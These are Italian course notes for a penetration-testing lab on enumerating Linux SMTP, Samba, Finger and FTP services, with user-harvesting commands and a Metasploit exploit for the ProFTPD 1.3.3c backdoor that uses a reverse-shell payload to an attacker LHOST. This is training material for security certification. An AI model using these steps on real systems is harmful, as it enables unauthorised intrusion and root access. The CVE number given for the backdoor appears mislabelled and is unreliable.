# 020 — Linux Service Enumeration (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 20/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [020_Linux_Service_Enumeration.mp4.txt](020_Linux_Service_Enumeration.mp4.txt) · [020_Linux_Service_Enumeration.mp4.srt](020_Linux_Service_Enumeration.mp4.srt)

## Concetti chiave

- Lab con **4 target Linux**, uno per protocollo: **SMTP** (target1), **Samba** (target2), **Finger** (target3), **FTP** (target4).
- **SMTP** (25): user enum via comando **`VRFY`** o `EXPN`.
- **Samba** (139/445): equivalente Linux di SMB → enum con `enum4linux`, `smbmap`, `smbclient`, `rpcclient`.
- **Finger** (79): user enum via `finger user@host` o `finger-user-enum.pl`.
- **FTP** (21): anonymous login, banner grab, vulnerabilità versione (es. **ProFTPD 1.3.3c backdoor**).
- Multi-host nmap: file lista target con flag **`-iL targets.txt`**.

## Spiegazione approfondita

### Lab setup
```bash
cat /etc/hosts
# demo.ine.local   = target1 (SMTP)
# demo2.ine.local  = target2 (Samba)
# demo3.ine.local  = target3 (Finger)
# demo4.ine.local  = target4 (FTP)

echo "demo.ine.local
demo2.ine.local
demo3.ine.local
demo4.ine.local" > targets.txt

sudo nmap -sS -sV -T4 -iL targets.txt
```

### Target 1 — SMTP enumeration (porta 25)

```bash
sudo nmap -sV -p 25 demo.ine.local -oN target1_nmap.txt
# Postfix smtpd

# Lista NSE SMTP
ls /usr/share/nmap/scripts/ | grep smtp
# smtp-brute, smtp-commands, smtp-enum-users, smtp-ntlm-info, smtp-open-relay, smtp-vuln-*

# Comandi supportati (cerchiamo VRFY/EXPN)
sudo nmap --script smtp-commands -p 25 demo.ine.local

# User enum
sudo nmap --script smtp-enum-users -p 25 demo.ine.local
# → root, administrator, sysadmin

# Tutti gli script SMTP
sudo nmap --script "smtp-*" -p 25 demo.ine.local
```

Tool dedicato (preferibile a NSE per stealth):
```bash
smtp-user-enum -M VRFY \
  -U /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -t demo.ine.local
# Metodi disponibili: VRFY, EXPN, RCPT
```

### Target 2 — Samba enumeration (porte 139, 445)

```bash
sudo nmap -sV -p 139,445 demo2.ine.local -oN target2_nmap.txt
# Samba 3.x-4.x · workgroup RECON-LABS

# enum4linux: one-stop tool
enum4linux -a demo2.ine.local | grep "Local User"
# Rid cycling: john, sean, ellie, emma, ayesha, admin, nobody

# Share list + perms
smbmap -H demo2.ine.local
# public  READ, WRITE
# john    NO ACCESS
# ...

# Conferma con nmap
sudo nmap -p 445 --script smb-enum-shares demo2.ine.local

# Test anonymous su public share
smbclient //demo2.ine.local/public -N
smb: \> ls
smb: \> get secret/flag.txt

# RPC null session
rpcclient -U "" -N demo2.ine.local
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumdomains
rpcclient $> queryuser john
```

### Target 3 — Finger enumeration (porta 79)

Finger (TCP 79) = vecchio protocollo che fornisce info utenti loggati.

```bash
sudo nmap -sV -p 79 demo3.ine.local

# Query manuale
finger root@demo3.ine.local
finger diag@demo3.ine.local

# Brute via Metasploit
msf6 > use auxiliary/scanner/finger/finger_users
msf6 > set RHOSTS demo3.ine.local
msf6 > run
# → admin, administrator, apt, ...

# Brute via Perl script (più info)
cd /root/Desktop/tools/finger-user-enum
./finger-user-enum.pl \
  -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
  -t demo3.ine.local
# Output: utente, home dir, info aggiuntive
```

### Target 4 — FTP enumeration (porta 21)

```bash
sudo nmap -sV -p 21 demo4.ine.local
# ProFTPD 1.3.3c  → vulnerabile a backdoor!

searchsploit proftpd 1.3.3c

# Esegui NSE vuln scan
sudo nmap -p 21 --script "ftp-* and vuln" demo4.ine.local
# o
sudo nmap -p 21 --script vuln demo4.ine.local
# Conferma: ftp-proftpd-backdoor → exec id → uid=0(root)

# Altri NSE FTP utili
sudo nmap -p 21 --script ftp-anon demo4.ine.local
sudo nmap -p 21 --script ftp-brute demo4.ine.local
sudo nmap -p 21 --script ftp-syst demo4.ine.local

# Test anonymous manuale
ftp demo4.ine.local
# user: anonymous · password: <invio>
```

## Comandi & strumenti

| Servizio | Tool | Comando |
|---|---|---|
| SMTP | NSE | `nmap --script smtp-enum-users,smtp-commands,smtp-open-relay -p 25` |
| SMTP | `smtp-user-enum` | `-M VRFY -U users.txt -t <target>` |
| Samba | `enum4linux` | `enum4linux -a <target>` |
| Samba | `smbmap` | `smbmap -H <target>` |
| Samba | `smbclient` | `smbclient -L //<target>/ -N` · `smbclient //<target>/<share> -N` |
| Samba | `rpcclient` | `rpcclient -U "" -N <target>` → `enumdomusers` |
| Samba | NSE | `nmap --script smb-enum-shares,smb-enum-users -p 445` |
| Finger | `finger` | `finger user@<target>` |
| Finger | Perl script | `finger-user-enum.pl -U users.txt -t <target>` |
| Finger | Metasploit | `auxiliary/scanner/finger/finger_users` |
| FTP | `searchsploit` | `searchsploit proftpd 1.3.3c` |
| FTP | NSE vuln | `nmap -p 21 --script "ftp-* and vuln"` |
| FTP | NSE anon | `nmap -p 21 --script ftp-anon` |
| FTP | client | `ftp <target>` |
| Multi | nmap | `nmap -iL targets.txt` |

## Esempi pratici

```bash
# Multi-target scan iniziale
echo -e "demo.ine.local\ndemo2.ine.local\ndemo3.ine.local\ndemo4.ine.local" > targets.txt
sudo nmap -sS -sV -T4 -iL targets.txt -oA multi_scan

# SMTP user enum
smtp-user-enum -M VRFY -U common_users.txt -t demo.ine.local

# Samba full enum
enum4linux -a demo2.ine.local
smbmap -H demo2.ine.local
smbclient //demo2.ine.local/public -N -c "recurse ON; ls"

# Finger
./finger-user-enum.pl -U unix_users.txt -t demo3.ine.local

# FTP backdoor exploit (con Metasploit, non dettagliato nel video)
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 > set RHOSTS demo4.ine.local
msf6 > set PAYLOAD cmd/unix/reverse
msf6 > set LHOST <kali>
msf6 > exploit
```

Nota extra: oltre a `enum4linux` esiste **`enum4linux-ng`** (Python3, manutenuto). `smbmap` ha anche `-u <user> -p <pass>` per enum autenticata.

## Punti d'attenzione per l'esame eCPPT

- **`-iL targets.txt`** = scansiona lista di host (utile in lab multi-target).
- **SMTP user enum**: metodi **`VRFY`** (verifica user), **`EXPN`** (espande alias/mailing list), **`RCPT TO`** (fallback).
- Tool da ricordare: **`smtp-user-enum`** (`-M VRFY -U users.txt -t <target>`).
- **Samba = SMB Linux**: stessi tool (`smbclient`, `smbmap`, `rpcclient`, `enum4linux`).
- **`enum4linux -a`** = enum completa one-shot Samba.
- **RID cycling** via `rpcclient` → enum utenti senza credenziali.
- **Finger** (TCP 79) = obsoleto ma ancora trovabile su Linux legacy; user enum via brute.
- **ProFTPD 1.3.3c** = backdoor famosa (CVE-2010-4221), exploit Metasploit pronto.
- **`searchsploit <product> <version>`** è il primo check su qualunque banner.
- **`nmap --script vuln`** + porta = check rapido vulnerabilità note.

## Collegamenti con altri video

- Precedente: [[019_SNMP_Enumeration.mp4]]
- Prossimo: [[021_SMB_Relay_Attack.mp4]]
- SMB su Windows: [[018_SMB___NetBIOS_Enumeration.mp4]]
- Linux exploitation: [[023_Linux_Black-Box_Penetration_Test.mp4]]
- NSE generale: [[013_Nmap Scripting Engine (NSE)]]
